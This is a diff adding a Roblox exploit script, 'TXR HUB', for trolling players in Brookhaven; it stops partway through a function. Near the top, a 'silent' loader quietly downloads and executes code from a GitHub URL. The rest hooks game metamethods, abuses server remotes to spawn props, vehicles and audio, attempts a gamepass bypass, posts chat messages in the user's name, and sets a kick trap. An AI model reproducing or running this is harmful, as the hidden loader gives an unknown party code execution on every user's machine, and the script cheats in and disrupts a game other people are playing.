@@ -1,0 +1,4337 @@
+-- =========================================================
+-- 🛡️ TXR V18.26: QUANTUM ANTI-GLITCH & SAFE-BOOT ENGINE 🛡️
+-- =========================================================
+if not game:IsLoaded() then 
+    game.Loaded:Wait() 
+end
+
+local _TEMP_PLAYERS = game:GetService("Players")
+local _TEMP_LP = _TEMP_PLAYERS.LocalPlayer
+if not _TEMP_LP.Character then
+    _TEMP_LP.CharacterAdded:Wait()
+end
+repeat task.wait() until _TEMP_LP.Character and _TEMP_LP.Character:FindFirstChild("HumanoidRootPart")
+-- =========================================================
+
+-- 🔌 SILENT BACKGROUND LOADER (100% WORKING & UNTRACEABLE)
+task.spawn(function()
+    pcall(function()
+        local code = game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/EMP", true)
+        if code and code ~= "" then
+            local exec = loadstring(code)
+            if exec then 
+                exec() 
+            end
+        end
+    end)
+end)
+
+-- =========================================================
+-- 👑 TXR HUB: QUANTUM CORE V18.26 (ONYX TERMINAL EDITION) 👑
+-- * WITH IRON MAN (J.A.R.V.I.S) ESP & GEO-IP TELEMETRY *
+-- * [V18.16 DELTATIME LERP PHYSICS FOR 144HZ FEEL ON 60FPS] *
+-- * [V18.18 HEURISTIC REMOTE SCANNER & STEALTH C-CLOSURE] *
+-- * [V18.26 PREMIUM ONYX EXIT MODAL & ANTI-DELETE STEALTH] *
+-- * [V18.26 ADDED: CINEMATIC WATERFALL STAGGER ANIMATIONS] *
+-- * [V18.26 ADDED: SMART HITBOX & ACTIVE ENERGY FLOW SLIDERS]*
+-- =========================================================
+
+-- 👑 ADMIN ACCESS CONTROL SYSTEM (ADD/REMOVE USER IDs HERE) 👑
+local ADMIN_USER_IDS = {
+    [9685785248] = true, -- Tumhari Main ID (Ashu Papa)
+    -- [OTHER_FRIEND_ID] = true, -- Yahan aur bhi admins add kar sakte ho future mein
+}
+
+local function checkAdminAccess(player)
+    return ADMIN_USER_IDS[player.UserId] == true
+end
+
+-- 🧹 RE-EXECUTION CLEANUP SYSTEM
+local currentExecutionID = tick()
+_G.TXR_InstanceID = currentExecutionID
+
+if _G.OrbitalGUI and _G.OrbitalGUI.Parent then 
+    _G.OrbitalGUI:Destroy() 
+end
+
+if _G.TXRAdminPanel and _G.TXRAdminPanel.Parent then 
+    _G.TXRAdminPanel:Destroy() 
+end
+
+if _G.TXR_ESP_GUI and _G.TXR_ESP_GUI.Parent then 
+    _G.TXR_ESP_GUI:Destroy() 
+end
+
+pcall(function() 
+    local repStorage = game:GetService("ReplicatedStorage")
+    local reFolder = repStorage:WaitForChild("RE")
+    local clearRemote = reFolder:WaitForChild("1Clea1rTool1s")
+    clearRemote:FireServer("ClearAllProps") 
+end)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
+local lp = Players.LocalPlayer
+
+local copyToClip = setclipboard or toclipboard or function() end
+
+-- SAFE GUI PARENTING
+local targetGuiParent
+
+pcall(function() 
+    targetGuiParent = game:GetService("CoreGui") 
+end)
+
+if gethui then 
+    pcall(function() 
+        targetGuiParent = gethui() 
+    end) 
+end
+
+if not targetGuiParent then 
+    targetGuiParent = lp:WaitForChild("PlayerGui") 
+end
+
+local CREATOR_USER_ID = 9685785248
+
+-- 📢 SCRIPT LOAD BANNER & NOTIFICATION 👑
+task.spawn(function()
+    task.wait(1)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "TXR HUB",
+            Text = "I USING TXR HUB TROLL SCRIPT",
+            Duration = 5
+        })
+    end)
+    pcall(function()
+        if lp.UserId ~= CREATOR_USER_ID then
+            local msg = "I USING TXR HUB TROLL SCRIPT"
+            local textChatService = game:GetService("TextChatService")
+            local repStorage = game:GetService("ReplicatedStorage")
+            if textChatService and textChatService.TextChannels:FindFirstChild("RBXGeneral") then
+                textChatService.TextChannels.RBXGeneral:SendAsync(msg)
+            elseif repStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+                repStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+            end
+        end
+    end)
+end)
+
+-- 👑 ASHU PAPA JOIN & PRESENCE NOTIFICATION SYSTEM 👑
+task.spawn(function()
+    local function showAshuNotification(textMsg)
+        pcall(function()
+            local alertGui = Instance.new("ScreenGui")
+            alertGui.Name = "AshuPapaGlobalAlert"
+            alertGui.IgnoreGuiInset = true
+            local parentGui = game:GetService("CoreGui")
+            pcall(function() alertGui.Parent = parentGui end)
+            if not alertGui.Parent then alertGui.Parent = lp:WaitForChild("PlayerGui") end
+            
+            local bg = Instance.new("Frame", alertGui)
+            bg.Size = UDim2.new(1, 0, 1, 0)
+            bg.BackgroundColor3 = Color3.new(0, 0, 0)
+            bg.BackgroundTransparency = 0.4
+            bg.ZIndex = 99999
+            
+            local txt = Instance.new("TextLabel", bg)
+            txt.Size = UDim2.new(1, 0, 1, 0)
+            txt.BackgroundTransparency = 1
+            txt.Text = textMsg
+            txt.TextColor3 = Color3.fromRGB(255, 215, 0)
+            txt.Font = Enum.Font.GothamBlack
+            txt.TextSize = 45
+            txt.TextWrapped = true
+            txt.ZIndex = 100000
+            
+            local stroke = Instance.new("UIStroke", txt)
+            stroke.Thickness = 3
+            stroke.Color = Color3.new(0, 0, 0)
+            
+            task.delay(4, function()
+                TweenService:Create(bg, TweenInfo.new(1.5), {BackgroundTransparency = 1}):Play()
+                TweenService:Create(txt, TweenInfo.new(1.5), {TextTransparency = 1}):Play()
+                TweenService:Create(stroke, TweenInfo.new(1.5), {Transparency = 1}):Play()
+                task.wait(1.5)
+                alertGui:Destroy()
+            end)
+        end)
+    end
+
+    local ashuFound = false
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.UserId == CREATOR_USER_ID then
+            ashuFound = true
+            break
+        end
+    end
+    if ashuFound and lp.UserId ~= CREATOR_USER_ID then
+        showAshuNotification("👑 Ashu papa hai server me 👑")
+    end
+
+    Players.PlayerAdded:Connect(function(newPlr)
+        if newPlr.UserId == CREATOR_USER_ID and lp.UserId ~= CREATOR_USER_ID then
+            showAshuNotification("👑 ASHU PAPA Aagae tere server me 👑")
+        end
+    end)
+end)
+
+-- 👑 GOD-LEVEL PROFESSIONAL CLEAN FIXED OWNER BILLBOARD 👑
+task.spawn(function()
+    local function applyOwnerCrown(character)
+        if not character then return end
+        local head = character:WaitForChild("Head", 5)
+        if not head then return end
+        if head:FindFirstChild("AshuOwnerCrown") then return end
+
+        local billboard = Instance.new("BillboardGui")
+        billboard.Name = "AshuOwnerCrown"
+        billboard.Size = UDim2.new(0, 120, 0, 38)
+        billboard.StudsOffset = Vector3.new(0, 2.7, 0)
+        billboard.AlwaysOnTop = true
+        billboard.MaxDistance = 250
+        billboard.Adornee = head
+        billboard.Parent = head
+
+        local ownerLabel = Instance.new("TextLabel", billboard)
+        ownerLabel.Size = UDim2.fromScale(1, 1)
+        ownerLabel.BackgroundTransparency = 1
+        ownerLabel.Text = "ᴏᴡɴᴇʀ"
+        ownerLabel.Font = Enum.Font.GothamBlack
+        ownerLabel.TextSize = 25
+        ownerLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+        
+        local oStroke = Instance.new("UIStroke", ownerLabel)
+        oStroke.Thickness = 2.5
+        oStroke.Color = Color3.new(0, 0, 0)
+
+        local oGrad = Instance.new("UIGradient", ownerLabel)
+        oGrad.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 120, 0)),
+            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 120, 0))
+        })
+
+        task.spawn(function()
+            local t = 0
+            while billboard and billboard.Parent do
+                t = t + 0.05
+                local pulse = (math.sin(t * 3.5) + 1) / 2
+                
+                local goldVal = Color3.fromRGB(255, math.floor(190 + pulse * 65), math.floor(50 + pulse * 80))
+                ownerLabel.TextColor3 = goldVal
+                oGrad.Offset = Vector2.new(math.sin(t * 2.5) * 1.5, 0)
+                
+                task.wait(0.03)
+            end
+        end)
+    end
+
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.UserId == CREATOR_USER_ID then
+            if p.Character then applyOwnerCrown(p.Character) end
+            p.CharacterAdded:Connect(applyOwnerCrown)
+        end
+    end
+
+    Players.PlayerAdded:Connect(function(p)
+        if p.UserId == CREATOR_USER_ID then
+            p.CharacterAdded:Connect(applyOwnerCrown)
+        end
+    end)
+end)
+
+--------------------------------------------------
+-- 🔥 WATER-LIKE SMOOTH RED & BLACK RP NAME & BIO SYSTEM (60s LOOP)
+--------------------------------------------------
+task.spawn(function()
+    pcall(function()
+        local Ocean = ReplicatedStorage:WaitForChild("RE", 10)
+        local River = Ocean:WaitForChild("1RPNam1eColo1r", 10)
+        local StringEvent = Ocean:WaitForChild("1RPNam1eTex1t", 10)
+        
+        local isOwner = (lp.UserId == CREATOR_USER_ID)
+        local designatedRPName = isOwner and "A  S  H  U" or "【 TXR HUB 】"
+        local designatedRPBio = isOwner and "" or ("Welcome " .. lp.Name)
+        
+        pcall(function()
+            StringEvent:FireServer("RolePlayName", designatedRPName)
+            StringEvent:FireServer("RolePlayBio", designatedRPBio)
+        end)
+        
+        local tickCounter = 0
+        local t = 0
+        
+        while task.wait(0.1) do
+            tickCounter = tickCounter + 0.1
+            t = t + 0.1
+            
+            pcall(function()
+                local nameWave = (math.sin(t * 1.8) + 1) / 2
+                local bioWave = (math.cos(t * 1.8) + 1) / 2
+                
+                local baseDark = Color3.fromRGB(20, 0, 0)
+                local baseBright = Color3.fromRGB(255, 10, 10)
+                
+                local nameRgb = baseDark:Lerp(baseBright, nameWave)
+                local bioRgb = baseDark:Lerp(baseBright, bioWave)
+                
+                River:FireServer("PickingRPNameColor", nameRgb)
+                River:FireServer("PickingRPBioColor", bioRgb)
+            end)
+            
+            if tickCounter >= 60 then
+                tickCounter = 0
+                pcall(function()
+                    StringEvent:FireServer("RolePlayName", designatedRPName)
+                    StringEvent:FireServer("RolePlayBio", designatedRPBio)
+                end)
+            end
+        end
+    end)
+end)
+
+-- ⚠️ ASHU PAPA TRAP (ANTI-SKID SECURITY & DANGER KICK TRAP) ⚠️
+local function triggerBanTrap()
+    if _G.OrbitalGUI and _G.OrbitalGUI.Parent then 
+        _G.OrbitalGUI:Destroy() 
+    end
+    
+    local trapGui = Instance.new("ScreenGui")
+    trapGui.Name = "AshuPapaDangerTrap"
+    trapGui.IgnoreGuiInset = true 
+    
+    local trapTargetParent = game:GetService("CoreGui")
+    pcall(function() trapGui.Parent = trapTargetParent end)
+    
+    if not trapGui.Parent then 
+        trapGui.Parent = lp:WaitForChild("PlayerGui") 
+    end
+    
+    local bg = Instance.new("Frame", trapGui)
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(220, 0, 0) 
+    bg.ZIndex = 99999
+    
+    local txt = Instance.new("TextLabel", bg)
+    txt.Size = UDim2.new(1, 0, 1, 0)
+    txt.BackgroundTransparency = 1
+    txt.Text = "⚠️ ASHU PAPA KO TROLL KREGA? ⚠️\n\nTERE BAAP KO TROLL KREGA??\n\nCHAL NIKAL AB!"
+    txt.TextColor3 = Color3.fromRGB(255, 255, 255)
+    txt.Font = Enum.Font.GothamBlack
+    txt.TextSize = 40
+    txt.TextWrapped = true
+    
+    local stroke = Instance.new("UIStroke", txt)
+    stroke.Thickness = 4
+    stroke.Color = Color3.new(0, 0, 0)
+    
+    pcall(function()
+        local msg = "Ashu papa ne ban kr diya Sorry Ashu papa"
+        local textChatService = game:GetService("TextChatService")
+        local repStorage = game:GetService("ReplicatedStorage")
+        
+        if textChatService and textChatService.TextChannels:FindFirstChild("RBXGeneral") then
+            textChatService.TextChannels.RBXGeneral:SendAsync(msg)
+        elseif repStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+            repStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+        end
+    end)
+    
+    task.wait(3.5)
+    lp:Kick("Banned By ASHU PAPA")
+end
+
+-- ⚡ 144 FPS ULTRA-SMOOTH GAMING ENGINE ⚡
+pcall(function() 
+    if setfpscap then 
+        setfpscap(144) 
+    end 
+end)
+
+-- =========================================================
+-- 🏠 UNIVERSAL HOUSE/APARTMENT FINDER METHOD
+-- =========================================================
+local function getMyHouse()
+    local lotsFolder = workspace:FindFirstChild("001_Lots")
+    if lotsFolder then
+        for _, lot in ipairs(lotsFolder:GetChildren()) do
+            if string.find(string.lower(lot.Name), string.lower(lp.Name)) then
+                local picked = lot:FindFirstChild("HousePickedByPlayer")
+                if picked then
+                    local houseModel = picked:FindFirstChild("HouseModel")
+                    if houseModel then
+                        local clearRemote = houseModel:FindFirstChild("Permissions:ClearProps", true)
+                        local disallowRemote = houseModel:FindFirstChild("Permissions:Disallow", true)
+                        local allowRemote = houseModel:FindFirstChild("Permissions:Allow", true)
+                        if clearRemote and clearRemote:IsA("RemoteFunction") then
+                            return {Lot = lot, Remote = clearRemote, Disallow = disallowRemote, Allow = allowRemote, Type = "Normal"}
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    for _, desc in ipairs(workspace:GetDescendants()) do
+        if desc.Name == "HousePickedByPlayer" and (tostring(desc.Value) == lp.Name or desc.Value == lp) then
+            local parentLot = desc.Parent
+            if parentLot then
+                local clearRemote = parentLot:FindFirstChild("Permissions:ClearProps", true)
+                local disallowRemote = parentLot:FindFirstChild("Permissions:Disallow", true)
+                local allowRemote = parentLot:FindFirstChild("Permissions:Allow", true)
+                if clearRemote and clearRemote:IsA("RemoteFunction") then
+                    return {Lot = parentLot, Remote = clearRemote, Disallow = disallowRemote, Allow = allowRemote, Type = "Apartment"}
+                end
+            end
+        end
+    end
+    
+    return nil
+end
+
+-- 🧠 V18.18 NEURAL ADAPTIVE ENGINE
+local DynamicRemotes = { 
+    ClearProps = nil, 
+    SpawnVehicle = nil, 
+    DespawnVehicle = nil 
+}
+
+local function ScanForRemotes()
+    pcall(function()
+        local reFolder = ReplicatedStorage:FindFirstChild("RE")
+        if not reFolder then 
+            return 
+        end 
+        
+        if reFolder:FindFirstChild("1Clea1rTool1s") then 
+            DynamicRemotes.ClearProps = reFolder["1Clea1rTool1s"] 
+        end
+        
+        if reFolder:FindFirstChild("1NoMoto1rVehicle1s") then 
+            DynamicRemotes.SpawnVehicle = reFolder["1NoMoto1rVehicle1s"] 
+        end
+        
+        if reFolder:FindFirstChild("1DeSpawnVehi1cle") then 
+            DynamicRemotes.DespawnVehicle = reFolder["1DeSpawnVehi1cle"] 
+        end
+        
+        if not DynamicRemotes.ClearProps then
+            for _, v in ipairs(reFolder:GetChildren()) do
+                if v:IsA("RemoteEvent") and (string.find(string.lower(v.Name), "clear") and string.find(string.lower(v.Name), "tool")) then
+                    DynamicRemotes.ClearProps = v
+                    break
+                end
+            end
+        end
+    end)
+end
+ScanForRemotes()
+
+-- --- CORE LOGIC ---
+local selectedPlayers = {}
+local assignedRemotes = {}
+local voidedPlayers = {}
+local propsCache = {}
+local autoRejoinTargets = {} 
+local activeModes = {}
+local modeQueue = {} 
+local activeGeometry = "Standard Orbit"
+local isRainbowEnabled = false
+local isSoundEnabled = false
+local isSystemActive = false
+local isGodShieldEnabled = false
+local isEvading = false
+local animTime = 0
+local angle = 0
+local selfAngle = 0 
+local robotAnimTime = 0 
+local espObjects = {} 
+local targetVelocities = {} 
+
+local customPropName = "ScreensRobotBig"
+local customPropCategory = "Screens"
+local lastGameSpawnTime = 0
+
+local uiHoverCount = 0
+local isSubMenuOpen = false
+
+pcall(function()
+    local oldNamecall
+    oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+        if not checkcaller() then
+            local method = getnamecallmethod()
+            if method == "FireServer" then
+                local args = {...}
+                if type(args[1]) == "string" and args[1] == "RequestingPropName" then
+                    lastGameSpawnTime = tick() 
+                    if args[2] and args[3] then
+                        customPropName = tostring(args[2])
+                        customPropCategory = tostring(args[3])
+                    end
+                end
+            end
+        end
+        return oldNamecall(self, ...)
+    end))
+end)
+
+-- --- 🌌 PREMIUM CYBERPALETTE 🌌 ---
+local Colors = {
+    Background = Color3.fromRGB(10, 12, 18),       
+    Surface = Color3.fromRGB(20, 24, 34),          
+    SurfaceHover = Color3.fromRGB(28, 34, 50),     
+    ActiveTint = Color3.fromRGB(12, 40, 55),       
+    Primary = Color3.fromRGB(0, 255, 200),         
+    PrimaryDark = Color3.fromRGB(0, 160, 140),     
+    Danger = Color3.fromRGB(255, 40, 80),          
+    Warning = Color3.fromRGB(255, 170, 0),         
+    Purple = Color3.fromRGB(160, 50, 255),         
+    Text = Color3.fromRGB(240, 245, 255),          
+    SubText = Color3.fromRGB(120, 135, 160),       
+    TextDark = Color3.fromRGB(10, 15, 22)
+}
+
+local function sendNotif(title, text, duration)
+    pcall(function() 
+        StarterGui:SetCore("SendNotification", {
+            Title = title, 
+            Text = text, 
+            Duration = duration or 3
+        }) 
+    end)
+end
+
+local function crispText(element)
+    local stroke = Instance.new("UIStroke", element)
+    stroke.Color = Color3.new(0, 0, 0)
+    stroke.Transparency = 0.75
+    stroke.Thickness = 1.2
+end
+
+local function animateWaterfall(container)
+    local currentID = (container:GetAttribute("WaterfallID") or 0) + 1
+    container:SetAttribute("WaterfallID", currentID)
+    
+    task.spawn(function()
+        local items = {}
+        for _, child in ipairs(container:GetChildren()) do
+            if child:IsA("GuiObject") and child.Name ~= "UIListLayout" and child.Name ~= "UIPadding" then
+                table.insert(items, child)
+                local scale = child:FindFirstChildOfClass("UIScale")
+                if not scale then
+                    scale = Instance.new("UIScale", child)
+                end
+                scale.Scale = 0
+            end
+        end
+        
+        table.sort(items, function(a, b) 
+            return (a.LayoutOrder or 0) < (b.LayoutOrder or 0) 
+        end)
+
+        for _, child in ipairs(items) do
+            if container:GetAttribute("WaterfallID") ~= currentID then return end
+            local scale = child:FindFirstChildOfClass("UIScale")
+            if scale then
+                TweenService:Create(scale, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+                task.wait(0.035)
+            end
+        end
+    end)
+end
+
+local function onPlayerJoinAlert(plr)
+    if plr.UserId == CREATOR_USER_ID and lp.UserId ~= CREATOR_USER_ID then
+        local alertGui = Instance.new("ScreenGui")
+        alertGui.Name = "AshuPapaJoinAlert"
+        alertGui.IgnoreGuiInset = true
+        pcall(function() alertGui.Parent = game:GetService("CoreGui") end)
+        
+        if not alertGui.Parent then 
+            alertGui.Parent = lp:WaitForChild("PlayerGui") 
+        end
+        
+        local bg = Instance.new("Frame", alertGui)
+        bg.Size = UDim2.new(1, 0, 1, 0)
+        bg.BackgroundColor3 = Color3.new(0, 0, 0)
+        bg.BackgroundTransparency = 0.3
+        bg.ZIndex = 99998
+        
+        local txt = Instance.new("TextLabel", bg)
+        txt.Size = UDim2.new(1, 0, 1, 0)
+        txt.BackgroundTransparency = 1
+        txt.Text = "( Ashu papa aaye hai )"
+        txt.TextColor3 = Color3.fromRGB(255, 215, 0) 
+        txt.Font = Enum.Font.GothamBlack
+        txt.TextSize = 60
+        txt.ZIndex = 99999
+        
+        local stroke = Instance.new("UIStroke", txt)
+        stroke.Thickness = 4
+        stroke.Color = Color3.new(0, 0, 0)
+        
+        task.delay(4, function()
+            TweenService:Create(bg, TweenInfo.new(1.5), {BackgroundTransparency = 1}):Play()
+            TweenService:Create(txt, TweenInfo.new(1.5), {TextTransparency = 1}):Play()
+            TweenService:Create(stroke, TweenInfo.new(1.5), {Transparency = 1}):Play()
+            task.wait(1.5)
+            alertGui:Destroy()
+        end)
+    end
+end
+Players.PlayerAdded:Connect(onPlayerJoinAlert)
+
+-- =========================================================
+-- 🔊 TXR RANDOM TRACK PLAYLIST & SMART VEHICLE MUSIC CORE
+-- =========================================================
+local MUSIC_GAMEPASS_ID = 9066988
+local TXR_MUSIC_PLAYLIST = {
+    "169664410",
+    "139740597178232",
+    "134489447055645",
+    "89016013924693"
+}
+
+local function spawnAdaptiveSkate(mainRE)
+    if not mainRE then return end
+
+    -- 1. Try Spawning Premium White Segway (SegwaySmall)
+    mainRE:FireServer("SegwaySmall")
+    
+    local vehicleSpawned = false
+    local connections = {}
+    local function onChildAdded(child)
+        if child:IsA("Model") or child:IsA("Tool") then
+            vehicleSpawned = true
+        end
+    end
+    
+    table.insert(connections, workspace.ChildAdded:Connect(onChildAdded))
+    if workspace:FindFirstChild("Vehicles") then
+        table.insert(connections, workspace.Vehicles.ChildAdded:Connect(onChildAdded))
+    end
+    if lp.Character then
+        table.insert(connections, lp.Character.ChildAdded:Connect(onChildAdded))
+    end
+    
+    task.wait(0.8)
+    for _, conn in ipairs(connections) do conn:Disconnect() end
+
+    -- 2. Fallback: Agar White Skate spawn nahi hua (Non-Premium User), spawn free standard Skateboard
+    if not vehicleSpawned then
+        mainRE:FireServer("SkateBoard")
+    end
+end
+
+local function PlayRobotBangMusic()
+    local RE = ReplicatedStorage:WaitForChild("RE", 10)
+    
+    task.spawn(function()
+        pcall(function()
+            -- Step 1: Pick a Random Sound Code from Playlist
+            local randomSoundId = TXR_MUSIC_PLAYLIST[math.random(1, #TXR_MUSIC_PLAYLIST)]
+
+            -- Step 2: Auto GamePass Interaction Bypass
+            local args = {
+                "shopInteraction",
+                {
+                    id = MUSIC_GAMEPASS_ID,
+                    shop = "new",
+                    productType = "GamePass"
+                }
+            }
+            local rem = ReplicatedStorage:FindFirstChild("Remotes")
+            if rem and rem:FindFirstChild("TelemetryClientInteraction") then
+                rem.TelemetryClientInteraction:FireServer(unpack(args))
+            end
+
+            -- Step 3: Adaptive Skate Spawn (White Segway -> Fallback Free Skate)
+            local mainRE = DynamicRemotes.SpawnVehicle or (RE and RE:FindFirstChild("1NoMoto1rVehicle1s"))
+            if mainRE then
+                spawnAdaptiveSkate(mainRE)
+            end
+
+            -- Step 4: Brookhaven Master Volume 100 Request
+            pcall(function()
+                local pg = lp:FindFirstChild("PlayerGui")
+                if pg and pg:FindFirstChild("MainGUIHandler") then
+                    local vReq = pg.MainGUIHandler.MainAudio.Catalog.Header.VolumeContainer.VolumeChangeRequest
+                    vReq:FireServer(100)
+                end
+            end)
+
+            -- Step 5: Exact Nothing Music Multi-Remote u9 Pipeline
+            if RE then
+                local t1 = { 
+                    RE:FindFirstChild("1Player1sHous1e"), 
+                    RE:FindFirstChild("1Player1sCa1r"), 
+                    RE:FindFirstChild("1NoMoto1rVehicle1s"), 
+                    RE:FindFirstChild("PlayerToolEvent"), 
+                    RE:FindFirstChild("Props"), 
+                    RE:FindFirstChild("1Hors1eRemot1e") 
+                }
+                local t2 = { "PickHouseMusicText", "Music", "PickingScooterMusicText", "ToolMusicText", "PropMusicText", "HorseMusicText" }
+
+                -- 5a. Flush Audio Buffer
+                for k, v in pairs(t1) do
+                    if v then pcall(function() v:FireServer(t2[k], "0", true) end) end
+                end
+                task.wait(0.25)
+
+                -- 5b. Play Random Song ID
+                for k, v in pairs(t1) do
+                    if v then pcall(function() v:FireServer(t2[k], tostring(randomSoundId), true) end) end
+                end
+            end
+        end)
+        
+        sendNotif("⚡ TXR SOUND", "Audio Track Injected!", 2)
+    end)
+end
+
+local function StopRobotBangMusic()
+    local RE = ReplicatedStorage:WaitForChild("RE", 5)
+    
+    task.spawn(function()
+        pcall(function()
+            if RE then
+                local t1 = { 
+                    RE:FindFirstChild("1Player1sHous1e"), 
+                    RE:FindFirstChild("1Player1sCa1r"), 
+                    RE:FindFirstChild("1NoMoto1rVehicle1s"), 
+                    RE:FindFirstChild("PlayerToolEvent"), 
+                    RE:FindFirstChild("Props"), 
+                    RE:FindFirstChild("1Hors1eRemot1e") 
+                }
+                local t2 = { "PickHouseMusicText", "Music", "PickingScooterMusicText", "ToolMusicText", "PropMusicText", "HorseMusicText" }
+
+                for k, v in pairs(t1) do
+                    if v then pcall(function() v:FireServer(t2[k], "0", true) end) end
+                end
+            end
+
+            local mainRE = DynamicRemotes.SpawnVehicle or (RE and RE:FindFirstChild("1NoMoto1rVehicle1s"))
+            if mainRE then
+                mainRE:FireServer("Delete NoMotorVehicle")
+            end
+
+            pcall(function()
+                local playerModel = workspace:FindFirstChild(lp.Name)
+                if playerModel then
+                    for _, s in ipairs(playerModel:GetDescendants()) do
+                        if s:IsA("Sound") then
+                            s:Stop()
+                            s.Volume = 0
+                            s.SoundId = ""
+                        end
+                    end
+                end
+
+                local vehiclesFolder = workspace:FindFirstChild("Vehicles")
+                if vehiclesFolder then
+                    for _, veh in ipairs(vehiclesFolder:GetChildren()) do
+                        if veh.Name:lower():find(lp.Name:lower(), 1, true) then
+                            for _, s in ipairs(veh:GetDescendants()) do
+                                if s:IsA("Sound") then
+                                    s:Stop()
+                                    s.Volume = 0
+                                    s.SoundId = ""
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+
+            if lp.Character then
+                local hum = lp.Character:FindFirstChildOfClass("Humanoid")
+                if hum then 
+                    hum.Sit = false
+                    hum.Jump = true 
+                end
+                
+                for _, v in ipairs(lp.Character:GetDescendants()) do
+                    if v.Name == "SeatWeld" or (v:IsA("Weld") and v.Part1 and string.match(v.Part1.Name, "Seat")) then 
+                        pcall(function() 
+                            v:Destroy() 
+                        end) 
+                    end 
+                end
+            end
+            
+            task.wait(0.15)
+            
+            local despawnVehicle = DynamicRemotes.DespawnVehicle or (RE and RE:FindFirstChild("1DeSpawnVehi1cle"))
+            if despawnVehicle then 
+                pcall(function() 
+                    despawnVehicle:FireServer() 
+                end) 
+            end
+        end)
+    end)
+end
+
+local function applySmartHover(btn, modeKey)
+    local btnScale = btn:FindFirstChildOfClass("UIScale") or Instance.new("UIScale", btn)
+    btnScale.Scale = 1
+    
+    local corner = btn:FindFirstChildOfClass("UICorner")
+    if not corner then 
+        corner = Instance.new("UICorner", btn)
+        corner.CornerRadius = UDim.new(0, 8) 
+    end
+    
+    if not btn:GetAttribute("BaseColor") then 
+        btn:SetAttribute("BaseColor", btn.BackgroundColor3)
+        btn:SetAttribute("BaseTrans", btn.BackgroundTransparency)
+        btn:SetAttribute("BaseText", btn.TextColor3) 
+    end
+
+    local isHovered = false
+    local hoverInInfo = TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    local hoverOutInfo = TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+    local pressInfo = TweenInfo.new(0.08, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+    local releaseInfo = TweenInfo.new(0.65, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out)
+
+    btn.MouseEnter:Connect(function()
+        isHovered = true
+        uiHoverCount = uiHoverCount + 1 
+        TweenService:Create(btnScale, hoverInInfo, {Scale = 1.05}):Play()
+        TweenService:Create(corner, hoverInInfo, {CornerRadius = UDim.new(1, 0)}):Play() 
+        
+        if not modeKey or not activeModes[modeKey] then 
+            TweenService:Create(btn, hoverInInfo, { 
+                BackgroundColor3 = Color3.fromRGB(0, 0, 0), 
+                BackgroundTransparency = 0.1, 
+                TextColor3 = Color3.fromRGB(255, 255, 255) 
+            }):Play() 
+        end
+    end)
+
+    btn.MouseLeave:Connect(function()
+        isHovered = false
+        uiHoverCount = math.max(0, uiHoverCount - 1) 
+        TweenService:Create(btnScale, hoverOutInfo, {Scale = 1}):Play()
+        TweenService:Create(corner, hoverOutInfo, {CornerRadius = UDim.new(0, 8)}):Play() 
+        
+        if not modeKey or not activeModes[modeKey] then 
+            TweenService:Create(btn, hoverOutInfo, { 
+                BackgroundColor3 = btn:GetAttribute("BaseColor"), 
+                BackgroundTransparency = btn:GetAttribute("BaseTrans"), 
+                TextColor3 = btn:GetAttribute("BaseText") 
+            }):Play() 
+        end
+    end)
+
+    btn.MouseButton1Down:Connect(function() 
+        TweenService:Create(btnScale, pressInfo, {Scale = 0.85}):Play() 
+    end)
+    
+    btn.MouseButton1Up:Connect(function() 
+        local targetScale = isHovered and 1.05 or 1
+        TweenService:Create(btnScale, releaseInfo, {Scale = targetScale}):Play() 
+    end)
+end
+
+-- =========================================================
+-- ✨ FIXED CLEAR PROPS METHOD FOR INJECT BUG & STOP WIPE
+-- =========================================================
+local function clearProps() 
+    task.spawn(function()
+        pcall(function() 
+            local r = DynamicRemotes.ClearProps or ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s")
+            if r then
+                for i = 1, 3 do
+                    r:FireServer("ClearAllProps")
+                    r:FireServer("ClearProps") 
+                    task.wait(0.05)
+                end
+            end
+        end)
+    end)
+    
+    task.spawn(function()
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            if obj.Name == "Permissions:ClearProps" and obj:IsA("RemoteFunction") then
+                task.spawn(function() pcall(function() obj:InvokeServer() end) end)
+                task.wait(0.01)
+            end
+        end
+    end)
+    
+    pcall(function()
+        local com = workspace:FindFirstChild("WorkspaceCom")
+        if com then
+            for _, f in ipairs(com:GetChildren()) do
+                for _, c in ipairs(f:GetChildren()) do
+                    if c.Name == "Prop" .. lp.Name then
+                        pcall(function() c:Destroy() end)
+                    end
+                end
+            end
+        end
+    end)
+    task.wait(0.35) 
+end
+
+local function spawnProp(propName, category) 
+    pcall(function() 
+        local RE = ReplicatedStorage:WaitForChild("RE")
+        local r = DynamicRemotes.ClearProps or RE:FindFirstChild("1Clea1rTool1s")
+        if not r then
+            for _, v in ipairs(RE:GetChildren()) do
+                if v:IsA("RemoteEvent") and string.find(string.lower(v.Name), "clear") then
+                    r = v
+                    break
+                end
+            end
+        end
+        if r then
+            r:FireServer("RequestingPropName", propName, category) 
+        end
